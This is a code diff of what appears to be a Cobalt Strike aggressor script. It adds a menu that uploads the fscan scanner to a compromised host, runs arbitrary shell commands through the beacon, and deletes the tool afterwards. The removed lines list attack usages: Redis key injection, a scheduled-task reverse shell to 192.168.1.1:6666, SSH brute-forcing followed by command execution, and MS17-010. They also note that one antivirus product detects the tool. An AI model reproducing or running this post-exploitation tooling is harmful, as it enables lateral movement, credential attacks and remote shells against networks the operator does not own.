@@ -1,4 +1,34 @@
 menu "内网扫描" {
+  menu "fscan" {
+    item "上传fscan" {
+      $bid = $1;
+      $dialog = dialog("上传fscan", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &fscan);
+      dialog_description($dialog, "支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息等。项目地址：https://github.com/shadow1ng/fscan");
+      drow_text($dialog, "UploadPath",  "上传路径: ");
+      dbutton_action($dialog, "上传");
+      dialog_show($dialog);
+    }
+    sub fscan {
+      bcd($bid, $3['UploadPath']);
+      bupload($bid, script_resource("/scripts/Intranet scanning/fscan.exe"));
+    }
+    item "运行fscan"{
+      $bid = $1['@'];
+      $dialog = dialog("运行fscan",%(exec => "fscan.exe -h 192.168.1.1/24 -o ok.txt", bid => $bid),&fscan_run);
+      dialog_description($dialog, "注意控制台输出的使用说明，直接在下方输入执行指令：");
+      drow_text($dialog, "exec", "Exec: ");
+      dbutton_action($dialog, "运行");
+      dialog_show($dialog);
+    }
+    sub fscan_run{
+      $exec = $3['exec'];
+      bshell($bid, "$exec");
+    }
+    item "删除fscan"{
+      $bid = $1['@'];
+      bshell($bid, "taskkill -f /im fscan.exe & del /f /s /q fscan.exe");
+    }
+  }
   item "SharpWebScan(探测web服务)" {
     $bid = $1['@'];
     $dialog = dialog("SharpWebScan", %(iptype => "-IP",ip => beacon_info($bid,"internal"),port => "80,443,7001,8000,8001,8080,8888",bid => $bid), &SharpWebScan);
@@ -76,51 +106,7 @@ menu "内网扫描" {
     }
   }
 
-  menu "fscan" {
-    item "上传fscan" {
-      $bid = $1;
-      $dialog = dialog("上传fscan", %(UploadPath => "C:\\Users\\Public\\", bid => $bid), &fscan);
-      dialog_description($dialog, "经测试若有360会被杀，支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写私钥、计划任务反弹shell、读取win网卡信息等。项目地址：https://github.com/shadow1ng/fscan");
-      drow_text($dialog, "UploadPath",  "上传路径: ");
-      dbutton_action($dialog, "上传");
-      dialog_show($dialog);
-    }
-    sub fscan {
-      bcd($bid, $3['UploadPath']);
-      bupload($bid, script_resource("/scripts/Intranet scanning/fscan.exe"));
-    }
-    item "运行fscan"{
-			$bid = $1['@'];
-      btask($bid, "简单用法：", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24                      (默认使用全部模块)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub       (redis 写私钥)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -c whoami            (ssh 爆破成功后，命令执行)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ssh -p 2222       (指定模块ssh和端口)", "");
-      btask($bid, "fscan.exe -h 192.168.1.1/24 -m ms17010           (指定模块)", "");
-      btask($bid, " ", "");
-      btask($bid, "-h 192.168.1.1/24 (C段)", "");
-      btask($bid, "-h 192.168.1.1/16 (B段)", "");
-      btask($bid, "-h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息)", "");
-      btask($bid, "-hf ip.txt        (以文件导入)", "");
-      btask($bid, " ", "");
-      btask($bid, "fscan.exe -h      (查看完整使用方法)", "");
-      btask($bid, " ", "");
-      $dialog = dialog("运行fscan",%(exec => "fscan.exe -h 192.168.1.1/24", bid => $bid),&fscan_run);
-			dialog_description($dialog, "注意控制台输出的使用说明，直接在下方输入执行指令：");
-      drow_text($dialog, "exec", "Exec: ");
-			dbutton_action($dialog, "运行");
-			dialog_show($dialog);
-		}
-    sub fscan_run{
-      $exec = $3['exec'];
-			bshell($bid, "$exec");
-		}
-    item "删除fscan"{
-			$bid = $1['@'];
-      bshell($bid, "taskkill -f /im fscan.exe & del /f /s /q fscan.exe");
-    }
-  }
+  
 
 
   menu "crack爆破" {
